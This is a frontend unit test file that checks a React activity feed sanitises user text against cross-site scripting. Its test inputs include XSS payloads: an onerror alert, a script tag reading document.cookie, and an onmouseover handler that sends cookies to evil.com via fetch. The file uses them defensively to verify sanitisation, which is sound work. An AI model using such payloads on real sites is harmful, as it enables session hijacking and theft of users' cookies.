import { describe, it, expect, vi } from "vitest";
import { render } from "@testing-library/react";
import { RecentActivityFeed } from "./RecentActivityFeed";

// Mock formatRelativeTime to avoid date logic in tests
vi.mock("@/lib/formatters", () => ({
  formatRelativeTime: () => "just now",
}));

describe("RecentActivityFeed XSS Prevention", () => {
  const makeActivity = (text: string) => ({
    id: "test-1",
    icon: "CheckCircle2",
    color: "success",
    text,
    timestamp: new Date().toISOString(),
    user: { initials: "TU" },
  });

  it("should reject XSS script injection in activity text", () => {
    const xssPayload = '<img src=x onerror="alert(\'XSS\')">';
    const { container } = render(
      <RecentActivityFeed activities={[makeActivity(xssPayload)]} />
    );

    // DOMPurify should strip the onerror attribute
    const activityDiv = container.querySelector(
      ".text-caption.text-foreground"
    );
    expect(activityDiv?.innerHTML).not.toContain("onerror");
    expect(activityDiv?.innerHTML).not.toContain("alert");
  });

  it("should reject script tags in activity text", () => {
    const xssPayload = '<script>document.cookie</script>';
    const { container } = render(
      <RecentActivityFeed activities={[makeActivity(xssPayload)]} />
    );

    const activityDiv = container.querySelector(
      ".text-caption.text-foreground"
    );
    expect(activityDiv?.innerHTML).not.toContain("<script>");
    expect(activityDiv?.innerHTML).not.toContain("document.cookie");
  });

  it("should allow safe HTML in activity text", () => {
    const safeHtml = '<strong>John</strong> created a new booking';
    const { container } = render(
      <RecentActivityFeed activities={[makeActivity(safeHtml)]} />
    );

    const activityDiv = container.querySelector(
      ".text-caption.text-foreground"
    );
    expect(activityDiv?.innerHTML).toContain("<strong>John</strong>");
    expect(activityDiv?.innerHTML).toContain("created a new booking");
  });

  it("should strip event handlers from activity text", () => {
    const xssPayload =
      '<div onmouseover="fetch(\'https://evil.com?c=\'+document.cookie)">hover me</div>';
    const { container } = render(
      <RecentActivityFeed activities={[makeActivity(xssPayload)]} />
    );

    const activityDiv = container.querySelector(
      ".text-caption.text-foreground"
    );
    expect(activityDiv?.innerHTML).not.toContain("onmouseover");
    expect(activityDiv?.innerHTML).not.toContain("fetch");
    // The text content should still be there
    expect(activityDiv?.textContent).toContain("hover me");
  });
});
